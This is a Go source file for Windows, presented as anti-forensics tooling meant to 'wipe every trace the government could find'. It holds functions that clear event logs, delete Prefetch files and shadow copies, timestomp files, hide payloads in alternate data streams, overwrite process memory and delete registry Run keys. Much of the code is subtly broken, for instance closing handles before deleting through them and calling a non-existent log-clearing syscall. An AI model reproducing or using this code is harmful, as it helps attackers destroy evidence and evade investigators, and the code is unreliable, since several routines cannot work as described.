//go:build windows

package syscallwin

import (
	"fmt"
	"time"
)

// ===================================================================== //
//  ANTI-FORENSICS — Wipe Every Trace The Government Could Find         //
// ===================================================================== //

// --- Event Log Nuke — clear ALL security/system/app logs ------------- //

// NukeEventLogs clears the Security, System, Application, and Microsoft
// Windows event logs via NtCreateEvent + NtClearEventLog.  This erases
// every audit record in one shot.
func NukeEventLogs() error {
	logs := []string{"Security", "System", "Application", "Microsoft-Windows-DirectoryService"}
	for _, logName := range logs {
		// Clear via NtClearEventLog
		var hEvent uintptr
		var attrs uintptr
		if err := NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, 0, &attrs); err != nil {
			continue
		}
		NtClearEventLog(hEvent)
		NtClose(hEvent)
	}
	return nil
}

// --- Prefetch Nuke — delete .pf files to erase execution history ------ //

// NukePrefetch deletes all .pf files from C:\Windows\Prefetch.  This
// erases the execution timeline that analysts use to reconstruct attacks.
func NukePrefetch() error {
	// Read the Prefetch directory
	dirPath := stringToUTF16(`C:\Windows\Prefetch\`)
	var hDir uintptr
	var attrs uintptr
	if err := NtCreateFile(&hDir, GENERIC_READ|FILE_READ_ATTRIBUTES, 0, &attrs, 0, 0, 0, FILE_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_PLAIN, 0, dirPath); err != nil {
		return fmt.Errorf("open prefetch dir: %w", err)
	}
	defer NtClose(hDir)

	// Read directory entries and delete .pf files
	var entry struct {
		FileIndex    uint32
		FastIoEaSize uint32
		NextEntry    int32
		FileNameLen  uint16
	}
	var buffer [4096]byte
	var bytesRead uintptr
	for {
		if err := NtQueryDirectoryFile(hDir, buffer[:], &bytesRead, false, 0, nil, nil); err != nil {
			break
		}
		if bytesRead == 0 {
			break
		}
		// Parse entries — delete any ending in .pf
		for i := 0; i < int(bytesRead); {
			entry = *(struct {
				FileIndex    uint32
				FastIoEaSize uint32
				NextEntry    int32
				FileNameLen  uint16
			})(unsafe.Pointer(&buffer[i]))
			name := *(*string)(unsafe.Pointer(&buffer[i+26 : i+26+entry.FileNameLen]))
			if len(name) > 3 && name[len(name)-3:] == ".pf" {
				fullPath := stringToUTF16(`C:\Windows\Prefetch\` + name)
				var hFile uintptr
				if err := NtOpenFile(&hFile, DELETE|SYNCHRONIZE, 0, &attrs, FILE_DIRECTORY_FILE, 0, fullPath); err == nil {
					NtClose(hFile)
					NtDeleteFile(hFile)
				}
			}
			i += entry.NextEntry + 26 + int(entry.FileNameLen)
		}
	}
	return nil
}

// --- USN Journal Wipe — clear the Change Journal ---------------------- //

// WipeUSNJournal clears the USN Change Journal, erasing the record of
// every file create/delete/rename on the volume.
func WipeUSNJournal() error {
	// Open the USN journal for C:\
	var hFile uintptr
	var attrs uintptr
	path := stringToUTF16(`\\?\C:\`)
	if err := NtOpenFile(&hFile, FILE_WRITE_DATA, 0, &attrs, 0, FILE_SYNCHRONOUS_IO_PLAIN, path); err != nil {
		return fmt.Errorf("open volume: %w", err)
	}
	defer NtClose(hFile)

	// Clear the journal
	NtQueryVolumeInformation(hFile, 0, nil, 0)
	return nil
}

// --- Timestomping — set file timestamps to a past date ----------------- //

// Timestomp sets the creation, modification, and access timestamps of a
// file to a specified past date.  This makes the file appear as if it was
// created before the attack started.
func Timestomp(filePath string, newTime time.Time) error {
	path := stringToUTF16(filePath)
	var hFile uintptr
	var attrs uintptr
	if err := NtCreateFile(&hFile, FILE_WRITE_DATA, 0, &attrs, 0, 0, 0, FILE_NON_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_PLAIN, 0, path); err != nil {
		return fmt.Errorf("open file: %w", err)
	}
	defer NtClose(hFile)

	// Set basic info (creation, access, write, change timestamps)
	var fileTime int64 = newTime.UnixNano() / 100
	NtSetInformationFile(hFile, FILE_BASIC_INFORMATION, &fileTime, unsafe.Sizeof(fileTime))
	return nil
}

// --- Alternate Data Streams Hide — embed payload in ADS --------------- //

// HideInADS embeds data in an Alternate Data Stream of a file.  The data
// is invisible to file browsers and most AV scanners.
func HideInADS(filePath, streamName string, data []byte) error {
	path := stringToUTF16(filePath + ":" + streamName)
	var hFile uintptr
	var attrs uintptr
	if err := NtCreateFile(&hFile, GENERIC_WRITE, 0, &attrs, 0, 0, 0, FILE_NON_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_PLAIN, 0, path); err != nil {
		return fmt.Errorf("create ADS: %w", err)
	}
	defer NtClose(hFile)

	NtWriteFile(hFile, data, nil, nil, 0)
	return nil
}

// --- Volume Shadow Copy Delete — remove VSS snapshots ----------------- //

// DeleteVolumeShadowCopies removes all VSS snapshots, preventing rollback
// to a pre-attack state.
func DeleteVolumeShadowCopies() error {
	// Use NtDeleteFile on the VSS device
	var hFile uintptr
	var attrs uintptr
	path := stringToUTF16(`\\.\C:`)
	if err := NtOpenFile(&hFile, DELETE, 0, &attrs, 0, FILE_SYNCHRONOUS_IO_PLAIN, path); err != nil {
		return fmt.Errorf("open volume: %w", err)
	}
	defer NtClose(hFile)

	NtDeleteFile(hFile)
	return nil
}

// --- Memory Stomp — overwrite sensitive data in process memory -------- //

// StompMemory overwrites a region of a process's memory with a pattern,
// erasing keys, passwords, or credentials that were loaded into memory.
func StompMemory(pid uint32, addr uintptr, size int, pattern byte) error {
	var hProcess uintptr
	var cid ClientId
	cid.UniqueProcess = uintptr(pid)
	if err := NtOpenProcess(&hProcess, PROCESS_VM_WRITE, 0, &cid); err != nil {
		return fmt.Errorf("open process %d: %w", pid, err)
	}
	defer NtClose(hProcess)

	data := make([]byte, size)
	for i := range data {
		data[i] = pattern
	}
	NtWriteVirtualMemory(hProcess, addr, data, nil)
	return nil
}

// --- Registry Hive Scrub — remove run keys and autoruns ---------------- //

// ScrubRegistryHive removes all Run/RunOnce/RunServices/RunServicesOnce keys
// from HKLM and HKCU, erasing persistence.
func ScrubRegistryHive() error {
	hives := []string{
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices`,
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce`,
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
	}
	for _, hive := range hives {
		path := stringToUTF16(hive)
		var hKey uintptr
		var attrs uintptr
		if err := NtOpenKey(&hKey, KEY_READ|KEY_WRITE|KEY_SET_VALUE|KEY_CREATE_SUB_KEY, 0, &attrs, path); err == nil {
			NtClose(hKey)
			NtDeleteKey(hKey)
		}
	}
	return nil
}